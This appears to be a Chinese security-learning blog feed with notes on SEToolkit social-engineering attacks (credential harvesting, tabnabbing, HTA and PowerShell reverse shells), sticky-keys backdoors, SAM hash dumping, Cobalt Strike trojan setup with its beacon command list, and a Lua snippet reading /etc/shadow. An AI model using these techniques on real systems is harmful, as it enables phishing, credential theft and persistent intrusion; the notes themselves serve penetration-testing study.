console)：设计物理访问相同的所有攻击，例如：更改管理员用户的秘密、植入键盘记录器、提取存储的浏览器密码或安装后门</li></ol></li><li><p>基于语音的攻击</p><p> 任何利用语音信息欺骗用户对计算机执行操作或泄露敏感信息的攻击都可称为基于语音的社会工程学攻击</p><ul><li>语音钓鱼(Vishing)是利用语音消息记录或单独与受害者通话从而提取受害者个人或群体的信息的艺术。通常，语音钓鱼涉及可信任的剧本</li></ul></li></ol><h1 id="2-控制台上的物理攻击"><a href="#2-控制台上的物理攻击" class="headerlink" title="2. 控制台上的物理攻击"></a>2. 控制台上的物理攻击</h1><h2 id="2-1-samdump2和chntpw"><a href="#2-1-samdump2和chntpw" class="headerlink" title="2.1 samdump2和chntpw"></a>2.1 samdump2和chntpw</h2><p>转储密码散列的最佳方法之一是使用samdump2。可以通过打开所获得的系统电源，然后利用Kali U盘在BIOS中进行必要的更改来完成</p><ol><li>系统通过Kali启动后，在默认情况下，本地硬盘驱动器必须安装为一个媒体驱动器(假设媒体驱动器没有使用PGP或类似的加密)</li><li>如果驱动器无法安装，可以通过以下的步骤来安装驱动器，运行以下命令<code>mkdir /mnt/target1</code> <code>mount /dev/sda2 /mnt/target1</code></li><li>系统安装完成后，找到安装文件夹(一般是/media/root/&lt;ID&gt;/Windows/System32/Config)，并运行samdump2SYSTEM SAM</li></ol><p>此处应该是用u盘在BIOS中进行操作，具体操作目前不清楚后期跟进</p><h2 id="2-2-粘滞键"><a href="#2-2-粘滞键" class="headerlink" title="2.2 粘滞键"></a>2.2 粘滞键</h2><p>物理访问已解锁或没有密码的Windows计算机的控制台。攻击者可以利用Microsoft Windows粘滞键功能，在几秒钟之内建立一个后门。但是，需要一个管理员权限来替换可执行文件。一旦系统通过Kali Linux启动，攻击者就可以替换文件而不受任何限制。以下是攻击者用cmd.exe或powershell.exe替换Windows的实用程序的列表：</p><ul><li>sethc.exe</li><li>utilman.exe</li><li>osk.exe</li><li>narrator.exe</li><li>magnify.exe</li><li>displayswitch.exe</li></ul><p>之后跟进具体操作</p><h1 id="3-创建流氓物理设备"><a href="#3-创建流氓物理设备" class="headerlink" title="3. 创建流氓物理设备"></a>3. 创建流氓物理设备</h1><p>查看后发现有点无法进行实际操作，之后尝试具体操作</p><h1 id="4-社会工程学工具包"><a href="#4-社会工程学工具包" class="headerlink" title="4. 社会工程学工具包"></a>4. 社会工程学工具包</h1><p>在命令行中输入<code>setoolkit</code>进入主界面</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20211003191845.png" alt="SEToolkit 主界面"></p><blockquote><p> Select from the menu:</p><ol><li><p>Social-Engineering Attacks</p></li><li><p>Penetration Testing (Fast-Track)</p></li><li><p>Third Party Modules</p></li><li><p>Update the Social-Engineer Toolkit</p></li><li><p>Update SET configuration</p></li><li><p>Help, Credits, and About</p></li></ol><div class="hljs code-wrapper"><pre><code>Exit the Social-Engineer Toolkit</code></pre></div><p>1)社会工程学攻击  </p><p>2)渗透测试(快速通道)  </p><p>3)第三方模块  </p><p>4)更新社会工程师工具包  </p><p>5)更新SET配置  </p><p>6)帮助、信用和About </p><p>退出社会工程师工具箱  </p></blockquote><p>之后选择1(社会工程学攻击)</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20211003191704.png" alt="SEToolkit 子菜单"></p><p>下面对社会工程学攻击做简单介绍：</p><ol><li><strong>网络钓鱼攻击媒介</strong>(Spear-Phishing Attack Vector)：攻击者创建邮件信息，并使用附加漏洞将信息发送给目标受害者</li><li><strong>网站攻击媒介</strong>(Website Attack Vectors)：使用多重基于Web的攻击，包括：<ol><li>Java小程序攻击方法(Java applet attack method)：伪造一份Java证书，并且运行一个基于Metasploit的负载，可有效针对Windows、Linux和MacOS目标进行攻击</li><li>Metasploit浏览器利用方法(Metasploit browser exploit method)：使用iFrame攻击，运行一个Metasploit负载</li><li>凭据收割机攻击方法(Credential harvester attack method)：对网站进行复制，并且通过对POST参数进行重写，使得攻击者可以拦截并窃取用户的凭证。当窃取完成后，将受害者重定向回原来的网站</li><li>标签钓鱼攻击方法(Tabnabbing attack method)：对一个非活动的浏览器标签页面进行复制，修改复制后的页面，使其与攻击者连接，最后使用该页面替换原有标签信息。当用户登录该页面时，用户的凭证将回发送给攻击者</li><li>Web劫持攻击方法(Web jacking attack method)：使用iFrame替代，合法地将某些URL连接设置为高亮。当该链接被点击时弹出一个窗口，该窗口连接到一个恶意链接</li><li>Web综合攻击方法(Multi-attack Web method)：允许一个攻击者选择若干，或者全部可以同时使用的攻击手段，包括：<ul><li>Java小程序攻击方法</li><li>Metasploit浏览器利用方法</li><li>凭证收割机攻击方法</li><li>标签钓鱼攻击方法</li><li>中间人攻击方法</li></ul></li><li>全屏攻击方法(full-screen attack method)：当系统处于全屏模式时，攻击者在幕后发动的简单攻击方法</li><li>HTA(HTA attack method)：当一个攻击者提供一个假网站时，将自动下载.hta格式的HTML应用程序</li></ol></li><li>介质感染攻击发生器(Infectious Media Generator)：生成一个antorun.inf和Metasploit负载，一旦受感染的USB设备或者物理介质(CD或DVD)插入目标系统，会自动运行(前提是开启autorun选项)并且感染目标系统</li><li>创建负载和监听器(Create a Payload and Listener)：这个模块是创建一个Metasploit负载的快捷菜单驱动方法。攻击者必须使用单独的社会工程学攻击欺骗目标运行该模块</li><li>大规模邮件攻击(Mass Mailer attack)：允许攻击者向某个又加了地址或者一组接收者发送多封自定义邮件</li><li>基于Arduino的攻击媒介(Arduino-based attack vector)：通过对基于Arduino的设备写入程序实现，例如：Teensy。因为这些设备在物理连接Windows操作系统时，注册为USB接口的键盘设备，因此可以绕过基于禁用autorun或者其他终端保护的安全措施</li><li>无线接入点攻击媒介(wireless access point attackvector)：可以在攻击者的操作系统中创建一个伪造的无线接入点和DHCP服务器，并且将DNS解析请求重定向到攻击者的系统。攻击者随后可以进行一系列攻击，例如Java小程序攻击或者凭证收割机攻击</li><li>二维码生成攻击媒介(QRcode generator attack vector)：生成一个与攻击的URL有关的二维码</li><li>Powershell攻击媒介(Powershell attack vectors)：支持攻击者进行依赖于PowerShell的攻击</li><li>短信欺骗攻击媒介（SMS spoofing attack vector），可以让攻击者向某人的移动设备发送自定义的短信服务（ShortMessage Service）文本，并且对消息的来源进行伪造，这个模块最近被屏蔽了</li><li>第三方模块(Third Party Modules)：支持攻击者使用远程管理工具汤米版(Remote Administration Tool TommyEdition，RATTE)作为Java小程序攻击的一部分，或者作为一个独立的负载。RATTE是一个文本目录驱动的远程访问工具</li></ol><p>其中SEToolkit也提供了快速跟踪渗透测试(fast-track penetration testing)的菜单项。</p><p>快速跟踪渗透测试支持对一些特殊工具的快速访问，例如：支持暴力破解认证和SQL数据库密码破解，还有一些基于Python、SCCM攻击媒介、Dell computer DRAC/chassis攻击、用户枚举和PsExec PowerShell注入等客户端攻击</p><p>快速跟踪渗透测试菜单项同时也提供对Metasploit框架、SEToolkit和SEToolkit配置的升级功能。由于Kali并不支持全部的额外选项，而且这些额外选项可能会造成依赖性干扰，因此要尽量避免使用</p><h2 id="4-1-使用网站攻击媒介–凭据收割机攻击方法"><a href="#4-1-使用网站攻击媒介–凭据收割机攻击方法" class="headerlink" title="4.1 使用网站攻击媒介–凭据收割机攻击方法"></a>4.1 使用网站攻击媒介–凭据收割机攻击方法</h2><p>首先介绍凭证：通常为用户名和密码，是用户访问网络、计算机系统和数据的依据。攻击者可以间接或直接使用这种信息进行攻击</p><p>SEToolkit的凭据收割机攻击，使用克隆的网站收集凭据</p><p>发动攻击是中主菜单中选择Website Attack Vectors(网站攻击媒介)之后选择Credential Harvester Attack Method(凭据收割机攻击方法)，然后选择Site Cloner(网站克隆)^此处只能克隆简单的post发送表单的界面^</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20211003213531.png" alt="凭据收割示例"></p><p>完成凭据收集后按<code>Ctrl+C</code>在/root/.set/reports/2021-10-03(今日日期)/目录中将生成XML和HTML两种格式的报告</p><p>注意到URL栏的地址并不是Facebook的认证地址。如果注意到了这个地址，大部分用户会意识到有问题。如果要成功的利用，攻击者需要一个合适的借口或故事，使受害者接受不寻常的网址</p><h2 id="4-2-使用网站攻击媒介–标签钓鱼攻击方法"><a href="#4-2-使用网站攻击媒介–标签钓鱼攻击方法" class="headerlink" title="4.2 使用网站攻击媒介–标签钓鱼攻击方法"></a>4.2 使用网站攻击媒介–标签钓鱼攻击方法</h2><p>标签钓鱼(tabnabbing)通过在一个浏览器打开的标签页中加载一个假网页来骗取用户的信任。通过冒充Gmail、Facebook或其他任何网站发布的需要提供数据(通常是用户名和密码)的网页。一个标签钓鱼攻击可以收集受害者的凭据</p><p>发动攻击流程是选择1(Social-Engineering Attacks)，下一菜单选择2(Website Attack Vectors),最后选择标签钓鱼攻击4(Tabnabbing Attack Method)来启动</p><blockquote><p>使用克隆始终出现错误: Printing the error : urllib has no attribute urlopen</p><p>Please help me how to solve this…</p><p>在搜索后按照大佬修改</p><p>The issue is in social-engineer-toolkit/src/webattack/tabnabbing/tabnabbing.py<br><a href="https://github.com/trustedsec/social-engineer-toolkit/blob/5e057388e5b7ea521d4658f3e22c874d52bb4f43/src/webattack/tabnabbing/tabnabbing.py">https://github.com/trustedsec/social-engineer-toolkit/blob/5e057388e5b7ea521d4658f3e22c874d52bb4f43/src/webattack/tabnabbing/tabnabbing.py</a></p><p>Line 65<br><code>favicon = urllib.urlopen(&quot;%s/favicon.ico&quot; % (URL))</code><br>Should be:<br><code>favicon = urllib.request.urlopen(&quot;%s/favicon.ico&quot; % (URL))</code></p><p>Because python3 uses different urllib syntax.</p><p>Go to ./usr/share/set/src/webattack/tabnabbing/tabnabbing.py<br>Adjust the python file, run again and it will work.</p></blockquote><p>调整后可以成功运行</p><p>首先是显示加载的界面</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20211004105759.png" alt="页面加载中"></p><p>之后成功显示gmail的界面</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20211004105758.png" alt="gmail登录页面"></p><p>写入gmail之后无法进行下一步，卡在了当前页面。此时setoolkit显示内容如下</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20211004105800.png" alt="setoolkit显示"></p><p>网站攻击媒介的”玛丽冰雹”攻击是综合攻击网页方法(Multi-attack Web method)，它允许攻击者一次执行几种他们所选的不同的攻击，默认情况下，所有攻击是被禁止的，需要选择一个进行执行</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20211004110617.png" alt="Multi-Attack 选择生效的攻击方法"></p><h2 id="4-3-HTA攻击"><a href="#4-3-HTA攻击" class="headerlink" title="4.3 HTA攻击"></a>4.3 HTA攻击</h2><p>该类型攻击是一个简单的HTML应用程序，可为远程攻击者提供完全访问。HTA通常的文件扩展名为.hta。HTA文件运行类似.exe文件。当通过浏览器远程执行时，在HTA下载之前会询问一次用户是否保存并运行应用程序。如果保存，它可以简单地按需运行</p><p>可以使用Web技术为Windows操作系统创建恶意应用程序：使用SEToolkit启动HTA攻击流程是：从主菜单选择1(Social-Engineering Attacks)之后选择子菜单的2(Website Attack Vectors)，然后选择7(HTA Attack Method)最后选择2Site Cloner克隆任何网站</p><p>此处克隆<a href="http://www.baidu.com访问对应ip地址后会尝试下载对应的hta文件./">www.baidu.com访问对应IP地址后会尝试下载对应的hta文件。</a></p><p>之后运行hta文件会反向连接到Metasploit中</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20211004113649.png" alt="HTA示例"></p><h2 id="4-4-使用PowerShell字母数字的shellcode注入攻击"><a href="#4-4-使用PowerShell字母数字的shellcode注入攻击" class="headerlink" title="4.4 使用PowerShell字母数字的shellcode注入攻击"></a>4.4 使用PowerShell字母数字的shellcode注入攻击</h2><p>基于PowerShell的更有效的攻击，适用于所有Windows Vista之后的微软操作系统。因为PowerShell的shell code可以很容易地注入目标的物理内存中，使用该载体的攻击不会触发病毒警报</p><p>使用SEToolkit的PowerShell攻击流程如下：在主菜单选择1(Social-Engineering Attacks)，之后选择9(Powershell Attack Vectors)</p><p>此时提供四种攻击选项：</p><blockquote><ol><li>Powershell Alphanumeric Shellcode Injector</li><li>Powershell Reverse Shell</li><li>Powershell Bind Shell</li><li>Powershell Dump SAM Database</li></ol></blockquote><p>选择一个进行IP地址和端口的设置，此时将生成的内容发送给受害者，并诱使其执行(执行较为麻烦，直接复制粘贴无法成功？<del>怎么可以了。。。</del>)</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20211004122849.png" alt="powershell示例"></p>]]></content>
    
    
    <categories>
      
      <category>书籍 Kali高级渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kali高级渗透测试</tag>
      
      <tag>书籍</tag>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CobaltStrike基础</title>
    <link href="/2021/09/24/%E4%BF%A1%E5%AE%89/%E6%B8%97%E9%80%8F/CobaltStrike%E5%9F%BA%E7%A1%80/"/>
    <url>/2021/09/24/%E4%BF%A1%E5%AE%89/%E6%B8%97%E9%80%8F/CobaltStrike%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="CobaltStrike基础"><a href="#CobaltStrike基础" class="headerlink" title="CobaltStrike基础"></a>CobaltStrike基础</h1><p>重要是熟悉了CobaltStrike基本使用，和在虚拟机中安装服务器，映射到公网IP来获取靶机的办法</p><p>参考<a href="https://www.cnblogs.com/ta1zi/p/14677758.html">博客</a></p><p>首先按照博客中的内容进行监听端口的设置，此处是准备的两个端口，一个是需要生成木马对应的端口，一个是监听的本地端口</p><p>设置监听端口的具体操作是选择 Cobalt Strike -&gt; Listeners</p><p>显示如下界面</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210926180348.png" alt="CS的Listeners"></p><p>点击Add进行设置</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210926180454.png" alt="监听设置"></p><p>参考博客所说的内容</p><p>HTTP Hosts：是发送的对应IP地址</p><p>HTTP Port(C2)：是发送的对应端口</p><p>新建完成后按照 Attacks -&gt; Packages选择对应的监听进行木马的生成</p><p>之后在目标机中运行链接成功，整个连接流程是目标机器发送信息到公网IP，公网IP映射到本地端口，通过监听本地端口来进行连接</p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210926182832.png" alt="cs连接成功"></p><p>此处记录help显示的内容</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">argue           匹配进程的欺骗参数<br>blockdlls               在子进程中阻止非Microsoft DLL<br>browserpivot            设置浏览器透视会话<br>cancel          取消正在进行的下载<br>cd              更改目录<br>checkin         呼叫总部并发布数据<br>chromedump              从Google Chrome恢复凭据<br>clear           清除信标队列<br>connect         通过TCP连接到信标对等方<br>covertvpn               部署隐蔽VPN客户端<br>cp              复制文件<br>dcsync          从DC中提取密码哈希<br>desktop         查看目标的桌面并与之交互<br>dllinject               将反射DLL注入进程<br>dllload         使用LoadLibrary（）将DLL加载到进程中<br>download                下载文件<br>downloads               列出正在进行的文件下载<br>drives          列出目标上的驱动器<br>elevate         在提升的上下文中生成会话<br>execute         在目标上执行程序（无输出）<br>execute-assembly                在目标上的内存中执行本地.NET程序<br>exit            终止信标会话<br>getprivs                在当前令牌上启用系统权限<br>getsystem               尝试获取系统<br>getuid          获取用户ID<br>hashdump                转储密码哈希<br>help            帮助菜单<br>inject          在特定进程中生成会话<br>inline-execute          在此会话中运行信标对象文件<br>jobkill         杀死长时间运行的利用后任务<br>jobs            列出长期运行的利用后任务<br>jump            在远程主机上生成会话<br>kerberos_ccache_use             将kerberos票证从缓存应用到此会话<br>kerberos_ticket_purge           从此会话中清除kerberos票证<br>kerberos_ticket_use             将kerberos票证应用于此会话<br>keylogger               启动击键记录器<br>kill            终止进程<br>link            通过命名管道连接到信标对等点<br>logonpasswords          使用mimikatz转储凭据和哈希<br>ls              列出文件<br>make_token              创建令牌以传递凭据<br>mimikatz                运行mimikatz命令<br>mkdir           制作目录<br>mode dns                使用DNS A作为数据通道（仅DNS信标）<br>mode dns-txt            使用DNS TXT作为数据通道（仅DNS信标）<br>mode dns6               使用DNS AAAA作为数据通道（仅DNS信标）<br>mv              移动文件<br>net             网络和主机枚举工具<br>note            为该信标指定一个注释<br>portscan                扫描网络中的开放服务<br>powerpick               通过非托管PowerShell执行命令<br>powershell              通过powershell.exe执行命令<br>powershell-import               导入powershell脚本<br>ppid            为衍生的事后交货作业设置父PID<br>printscreen             通过PrintScr方法拍摄一个屏幕截图<br>ps              显示进程列表<br>psinject                在特定进程中执行PowerShell命令<br>pth             使用Mimikatz传递散列<br>pwd             打印当前目录<br>reg             查询注册表<br>remote-exec             在远程主机上运行命令<br>rev2self                还原为原始令牌<br>rm              删除文件或文件夹<br>rportfwd                设置反向端口前进<br>rportfwd_local          通过Cobalt Strike客户端向前设置反向端口<br>run             在目标上执行程序（返回输出）<br>runas           以另一个用户的身份执行程序<br>runasadmin              在提升的上下文中执行程序<br>runu            在另一个PID下执行程序<br>screenshot              拍摄一个屏幕截图<br>screenwatch             定期拍摄桌面屏幕截图<br>setenv          设置环境变量<br>shell           通过cmd.exe执行命令<br>shinject                将外壳代码注入进程<br>shspawn         生成进程并将外壳代码注入其中<br>sleep           设置信标睡眠时间<br>socks stop              停止SOCKS4a服务器<br>spawn           生成会话<br>spawnas         作为另一个用户生成会话<br>spawnto         将可执行文件设置为将进程生成到<br>spawnu          在另一进程下生成会话<br>spunnel         通过rportfwd生成和隧道代理<br>spunnel_local           通过Cobalt Strike客户端rportfwd生成并隧道代理<br>ssh             使用SSH在主机上生成SSH会话<br>ssh-key         使用SSH在主机上生成SSH会话<br>steal_token             从进程中窃取访问令牌<br>timestomp               将时间戳从一个文件应用到另一个文件<br>unlink          断开与父信标的连接<br>upload          上传文件<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>信安 渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透</tag>
      
      <tag>CobaltStrike</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>漏洞评估</title>
    <link href="/2021/09/24/%E4%B9%A6%E7%B1%8D/Kali%E9%AB%98%E7%BA%A7%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E8%AF%84%E4%BC%B0/"/>
    <url>/2021/09/24/%E4%B9%A6%E7%B1%8D/Kali%E9%AB%98%E7%BA%A7%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E8%AF%84%E4%BC%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞评估"><a href="#漏洞评估" class="headerlink" title="漏洞评估"></a>漏洞评估</h1><p>漏洞评估的目的是找出最有可能攻击的安全漏洞。在杀链的利用阶段，漏洞评估的重点是创建访问以实现漏洞的目标映射，以排列漏洞和保持对目标的持续访问</p><h1 id="1-漏洞命名"><a href="#1-漏洞命名" class="headerlink" title="1. 漏洞命名"></a>1. 漏洞命名</h1><p>漏洞的扫描采用自动化过程和自动化程序。漏洞扫描会被检测到，隐形几乎不可能的。而且还会收到以下限制：</p><ul><li>通常情况下，漏洞扫描器是基于签名的，它只能检测已知的漏洞，仅当有一个已经存在的识别标志才能应用于目标</li><li>扫描器产生的大量输出中通常包含错误结果</li><li>扫描器可能对网络有负面影响，可能造成网络延迟或某些设备失效</li><li>在某些地区，扫描被认为是黑客行为，可能构成违法</li></ul><h1 id="2-本地和在线漏洞数据库"><a href="#2-本地和在线漏洞数据库" class="headerlink" title="2 本地和在线漏洞数据库"></a>2 本地和在线漏洞数据库</h1><p>漏洞的搜索可以从供应商的网站开始。同事在发布补丁和升级时，大多数的硬件和应用程序供应商都会提供和安全漏洞相关的信息</p><p>收集、分析和共享有关漏洞的网站信息如下：</p><ul><li>国家漏洞数据库，整合了所有由美国政府发布的公开漏洞数据：<a href="http://web.nvd.nist.gov/view/vuln/search">http://web.nvd.nist.gov/view/vuln/search</a></li><li>安全监控网站Secunia：<a href="http://secunia.com/community/">http://secunia.com/community/</a></li><li>数据包风暴安全网址：<a href="http://packetstormsecurity.com/">http://packetstormsecurity.com/</a></li><li>安全焦点网址：<a href="http://www.securityfocus.com/vulnerabilities">http://www.securityfocus.com/vulnerabilities</a></li><li>由Offensive Security维护的可以利用的漏洞数据库网址：<a href="http://www.exploit-db.com/">http://www.exploit-db.com</a></li><li>渗透测试人员可以浏览一下<a href="https://0day.today/%E8%8E%B7%E5%8F%96%E9%9B%B6%E6%97%A5%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF">https://0day.today/获取零日漏洞信息</a></li></ul><p>漏洞数据库也被复制到本地Kali中，并且可以在/usr/share/exploitdb目录中找到</p><p>搜索漏洞数据库的本地副本，需要使用如下命令<code>searchsploit 关键词</code>。这将调用一个脚本搜索所有漏洞列表的数据库文件(.csv)，返回已知漏洞的描述，以及和该漏洞相关的路径</p><p>搜索脚本从左至右扫描数据库CSV文件中的每一行，因此搜索项的顺序很重要，如：搜索Oracle10g将返回多个漏洞，但10g Oracle本身不会返回任何漏洞、搜索“vsFTPd”不会返回任何结果，而“vs FTPd”（“vs”和“FTPd”中间有空格）则会返回很多结果</p><p>漏洞利用以脚本的形式呈现，例如：Perl、Ruby和PHP等，都是相对容易实现的脚本</p><p>但是还有不易编译的脚本，且可能存在危险的漏洞利用：</p><ul><li>蓄意的错误或不完整的源代码，因此有经验的开发人员尽量让漏洞远离没有经验的用户</li><li>漏洞利用并不总是有详尽的文档解释</li><li>由于环境变化导致行为不一致（新的补丁应用到目标系统、目标应用程序中的语言变化）可能需要对源代码进行重大调整，这需要一个有经验的开发人员</li><li>免费提供的、包含恶意的代码，总是存在风险。渗透测试人员可能会认为它是在进行概念验证（POC）练习，并不知道该代码同时为该应用程序建了一个后门，可以供开发者使用</li></ul><h1 id="3-用nmap进行漏洞扫描"><a href="#3-用nmap进行漏洞扫描" class="headerlink" title="3. 用nmap进行漏洞扫描"></a>3. 用nmap进行漏洞扫描</h1><p>nmap还可以用于执行漏洞评估，可以利用nmap的功能编写自己的脚本，并使其自动化以方便利用，开发NSE的主要原因如下：</p><ul><li>网络发现：攻击者利用nmap的主要目的是网络发现</li><li>服务的分类版本检测：共计数千种服务。把多个版本的详细信息集中到同一个服务上显得更加复杂</li><li>漏洞检测：在广泛的网络范围内自动识别漏洞，然而，nmap本身不完全是漏洞扫描程序</li><li>后台检测：一些脚本被编写用来识别后台模式，如果网络上有任何蠕虫感染，一些脚本将被写入以识别该模式，这样使得攻击者的工作变得更集中，能专注于远程接管机器</li></ul><p>nmap更新脚本数据库命令<code>nmap --script-updatedb</code></p><p>针对目标主机运行脚本<code>nmap -T4 -A -sV -v3 -d -oA Target output --script all --script-args vulns.showall target.com</code></p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210927102116.png" alt="nmap脚本尝试"></p><h2 id="3-1-Lua脚本介绍"><a href="#3-1-Lua脚本介绍" class="headerlink" title="3.1 Lua脚本介绍"></a>3.1 Lua脚本介绍</h2><p>Lua是一种建立在C语言之上的轻量级嵌入式脚本语言，于1993年在巴西创立，至今仍然在积极发展中。它是一种强大而快速的编程语言，主要用于游戏应用和图像处理。Lua开发的安全工具有nmap、Wireshark和Snort 3.0等</p><p>选择Lua作为信息安全的脚本语言的原因之一是其紧凑性，没有缓冲区溢出和格式化字符串漏洞，并且可解析</p><p>Lua可以通过终端命令<code>apt-get insatall lua5.4</code>(最后加上具体版本)直接安装到Kali Linux。以下代码为示例，用于读取文件并打印第一行：</p><figure class="highlight lua"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs lua">#!/usr/bin/lua<br><span class="hljs-keyword">local</span> file=<span class="hljs-built_in">io</span>.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/etc/shadow&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>)<br>contents=file:<span class="hljs-built_in">read</span>()<br>file:<span class="hljs-built_in">close</span>()<br><span class="hljs-built_in">print</span>(contents)<br></code></pre></div></td></tr></table></figure><p>运行lua类似shell的运行首先赋予编译权限<code>chmod +x ./文件</code> 之后输入文件即可</p><h2 id="3-2-自定义NSE脚本"><a href="#3-2-自定义NSE脚本" class="headerlink" title="3.2 自定义NSE脚本"></a>3.2 自定义NSE脚本</h2><p>Lua NSE脚本示例，使用nmap标识在整个子网上搜索的特定文件位置：</p><figure class="highlight lua"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs lua"><span class="hljs-keyword">local</span> http= <span class="hljs-built_in">require</span> <span class="hljs-string">&#x27;http&#x27;</span><br>description= <span class="hljs-string">[[ This is my custom discovery on the network ]]</span><br>categories= &#123;<span class="hljs-string">&quot;safe&quot;</span>,<span class="hljs-string">&quot;discovery&quot;</span>&#125;<br><span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;http&quot;</span>)<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">portrule</span><span class="hljs-params">(host, port)</span></span><br>    <span class="hljs-keyword">return</span> port.number == <span class="hljs-number">80</span><br><span class="hljs-keyword">end</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span><span class="hljs-params">(host, port)</span></span><br>    <span class="hljs-keyword">local</span> response<br>    response = http.get(host,port,<span class="hljs-string">&quot;/config.php&quot;</span>)<br>    <span class="hljs-keyword">if</span> response.<span class="hljs-built_in">status</span> <span class="hljs-keyword">and</span> response.<span class="hljs-built_in">status</span> ~= <span class="hljs-number">404</span><br>        <span class="hljs-keyword">then</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;successful&quot;</span><br>    <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br></code></pre></div></td></tr></table></figure><p>将文件保存到/usr/share/nmap/scripts/文件中，最后进行脚本测试</p><p><code>nmap -vv -sV -Pn -p 80 --open --script=testscript.nse 192.168.66.1</code></p><p><img src="https://gitee.com/bsmslwx/BlogImg/raw/master/blog/20210927110818.png" alt="nmap 脚本结果"></p><p>对以上的NSE脚本解释：</p><ul><li>local http：require ‘http’：从Lua调用正确的库，该行调用HTTP脚本并将其作为本地请求</li><li>description：测试者/研究人员可以输入脚本的解释</li><li>categories：这通常有两个变量，其中一个声明是安全还是侵入</li></ul><h1 id="4-Web应用漏洞扫描器"><a href="#4-Web应用漏洞扫描器" class="headerlink" title="4. Web应用漏洞扫描器"></a>4. 